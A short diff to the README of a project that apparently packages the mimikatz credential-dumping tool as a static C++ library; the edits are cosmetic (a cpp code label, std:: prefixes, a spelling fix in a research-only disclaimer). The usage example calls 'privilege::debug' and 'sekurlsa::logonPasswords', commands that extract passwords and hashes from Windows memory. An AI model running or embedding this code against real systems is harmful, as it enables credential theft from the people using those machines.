@@ -12,17 +12,17 @@ Unlike original `mimikatz`, it does not include `mimilib` and `mimidrv`. Also, `
 
 ## Usage
 
-```
+```cpp
 #include "mimikatz-staticlib/mimikatz/mimikatz-staticlib.h"
 
 mimikatz_begin();
-wcout << mimkatz_exec(L"privilege::debug") << L"\n";
-wcout << mimkatz_exec(L"sekurlsa::logonPasswords") << L"\n";
-wcout << mimkatz_exec(L"coffee") << L"\n";
+std::wcout << mimkatz_exec(L"privilege::debug") << L"\n";
+std::wcout << mimkatz_exec(L"sekurlsa::logonPasswords") << L"\n";
+std::wcout << mimkatz_exec(L"coffee") << L"\n";
 mimikatz_end();
 ```
 
-This project is research only, plese do not use for illegal purposes.
+This project is research only, please do not use for illegal purposes.
 
 ## Credits
 
